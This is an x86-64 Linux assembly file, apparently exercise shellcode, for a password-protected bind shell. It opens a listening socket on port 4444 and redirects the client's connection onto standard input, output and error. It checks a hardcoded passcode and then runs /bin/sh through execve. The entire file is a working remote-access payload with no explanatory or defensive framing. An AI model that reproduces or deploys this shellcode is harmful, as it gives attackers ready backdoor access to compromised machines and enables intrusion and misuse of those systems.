global _start


_start:

	jmp real_start
	passwordquery: db 'Please enter your passcode : ', 0xa

real_start:
	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 
	
	xor rax, rax
	mov rdi, rax
	mov rsi, rdi
	mov rdx, rsi

	add rax, 41
	add rdi, 2
	add rsi, 1
	;add rdx, 0
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax
	push rax
	push rax
	mov word [rsp+2], 0x5c11
	mov byte [rsp], 0x2
;	sub rsp, 0x8

;	mov dword [rsp-4], eax
;	mov word [rsp-6], 0x5c11
;	mov word [rsp-8], 0x2
;	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	xor rax, rax
	mov rdx, rax
	add rax, 49
	
	mov rsi, rsp
	add rdx, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	xor rax, rax
	mov rsi, rax
	add rax, 50
	add rsi, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	xor rax, rax
	add rax, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent
	xor rax, rax
        add rax, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
	xor rax, rax
	mov rsi, rax
        add rax, 33
        syscall
	
	xor rax, rax
	mov rsi, rax
        add rax, 33
        add rsi, 1
        syscall
	
	xor rax, rax
	mov rsi, rax
        add rax, 33
        add rsi, 2
        syscall

; CHECK PASSWORD

    check:
	;just printout
        xor rax, rax
        mov rdx, rax
        add rax, 1
        mov rdi, rax
        lea rsi, [rel passwordquery]
        add rdx, 30
        syscall


	xor rax, rax
        mov rdi, rax
        mov rdx, rax
        mov rsi, rsp
        add rdx, 8
	syscall

	mov rax, 0x31307461506c314e
	mov rdi, rsi        ; point RDI to data from client
	scasq               ; compare RAX and [RDI]
	jne check

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
